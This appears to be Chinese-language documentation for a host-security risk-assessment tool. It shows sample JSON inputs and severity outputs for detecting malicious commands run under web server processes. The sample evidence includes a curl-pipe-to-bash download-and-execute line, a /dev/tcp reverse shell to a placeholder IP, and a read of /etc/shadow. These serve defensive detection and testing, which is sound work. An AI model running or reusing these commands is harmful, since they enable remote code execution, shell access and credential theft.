# 命令风险 — 可复现离线样例

以下是父引擎的完整输入与最终 `risk_items[0]` 字段节选，使用当前默认规则、策略和白名单。命令字符串只作为日志证据分析，不会执行。配置变化后应重新生成结果，不能把示例等级当作硬编码规则。

将任一输入保存为 `/tmp/secweaver-exec-input.json`，从仓库根目录运行：

```bash
python3 src/skills/risk-identification/scripts/assess.py \
  -i /tmp/secweaver-exec-input.json -o /tmp/secweaver-exec-output.json
```

## 1. 下载执行

输入：

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 443,
        "listener_process": "nginx",
        "listener_pid": 1234,
        "pid": "5678",
        "ppid": "1234",
        "exe": "/bin/bash",
        "command": [
          "/bin/sh",
          "-c",
          "curl http://example.test/a.sh | bash"
        ],
        "cwd": "/var/www/html",
        "comm": "sh",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-1"
      }
    ]
  }
}
```

最终输出节选：

```json
{
  "severity": "P0",
  "matched_rules": [
    "external_listener_shell_exec",
    "download_and_execute",
    "download_and_execute"
  ],
  "policy_rule_id": "WEB-SHELL-001",
  "recommended_action": "isolate_host_and_investigate"
}
```

## 2. 反弹 shell

输入：

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 80,
        "listener_process": "nginx",
        "listener_pid": 2001,
        "pid": "3002",
        "ppid": "2001",
        "exe": "/bin/bash",
        "command": [
          "/bin/bash",
          "-c",
          "bash -i >& /dev/tcp/203.0.113.44/4444 0>&1"
        ],
        "cwd": "/tmp",
        "comm": "bash",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-2"
      }
    ]
  }
}
```

最终输出节选：

```json
{
  "severity": "P0",
  "matched_rules": [
    "external_listener_shell_exec",
    "reverse_shell",
    "reverse_shell",
    "reverse_shell"
  ],
  "policy_rule_id": "WEB-SHELL-001",
  "recommended_action": "isolate_host_and_investigate"
}
```

## 3. 敏感文件读取

输入：

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 8080,
        "listener_process": "java",
        "listener_pid": 4000,
        "pid": "4100",
        "ppid": "4000",
        "exe": "/bin/cat",
        "command": [
          "cat",
          "/etc/shadow"
        ],
        "cwd": "/app",
        "comm": "cat",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-3"
      }
    ]
  }
}
```

最终输出节选：

```json
{
  "severity": "P0",
  "matched_rules": [
    "sensitive_file_read"
  ],
  "policy_rule_id": "RECON-HIGH-001",
  "recommended_action": "investigate_and_contain"
}
```

## 4. 普通命令仍需策略裁决

输入：

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 443,
        "listener_process": "nginx",
        "listener_pid": 1234,
        "pid": "9999",
        "ppid": "1234",
        "exe": "/bin/ls",
        "command": [
          "ls",
          "-la",
          "/var/log/nginx"
        ],
        "cwd": "/var/log/nginx",
        "comm": "ls",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-4"
      }
    ]
  }
}
```

最终输出节选：

```json
{
  "severity": "P1",
  "matched_rules": [],
  "policy_rule_id": "DEFAULT-ALERT",
  "recommended_action": "manual_review_5m"
}
```

第 4 例没有检测命中，但 `DEFAULT-ALERT` 给出 P1/人工复核；不是 P2/观察。完整输出还包含证据、数据缺口与策略上下文。需要 exec/file/connect 的跨源链路时，使用[溯源离线样例](../../../examples/traceability/README.zh-CN.md)，不要把单条风险项写成已确认攻击链。
